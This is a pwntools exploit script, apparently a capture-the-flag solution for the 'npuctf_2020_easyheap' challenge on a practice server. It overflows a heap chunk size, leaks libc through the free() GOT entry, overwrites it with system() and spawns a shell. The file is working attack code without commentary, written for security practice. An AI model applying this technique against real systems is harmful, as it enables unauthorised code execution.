from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process("npuctf_2020_easyheap")
io = remote('node4.buuoj.cn', 29065)
elf = ELF("npuctf_2020_easyheap")

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def create_heap(size, content):
	sla(b'Your choice :', b'1')
	sla(b'Size of Heap(0x10 or 0x20 only) : ', str(size).encode())
	sla(b'Content:', content)
	
def edit_heap(index, content):
	sla(b'Your choice :', b'2')
	sla(b'Index :', str(index).encode())
	sla(b'Content: ', content)

def show_heap(index):
	sla(b'Your choice :', b'3')
	sla(b'Index :', str(index).encode())
	
def delete_heap(index):
	sla(b'Your choice :', b'4')
	sla(b'Index :', str(index).encode())

create_heap(0x18, cyclic(0x38))	# 0
create_heap(0x18, cyclic(0x18))	# 1
create_heap(0x18, cyclic(0x18))	# 2
delete_heap(0)
edit_heap(1, b'/bin/sh'.ljust(0x18, b'\x00') + p8(0x41))
delete_heap(2)
create_heap(0x38, b'/bin/sh'.ljust(0x18, b'\x00') + p64(0x21) + p64(0x38) + p64(elf.got['free']))
show_heap(0)
io.recvuntil(b'Content : ')
free = u64(io.recv(6) + b'\x00\x00')
print(hex(free))
libc = LibcSearcher('free', free)
base = free - libc.dump('free')
print(hex(base))
system = base + libc.dump('system')
edit_heap(0, p64(system))
# gdb.attach(io)
delete_heap(1)
# edit_heap(0, cyclic(0x18) + p8(0x41))
io.interactive()
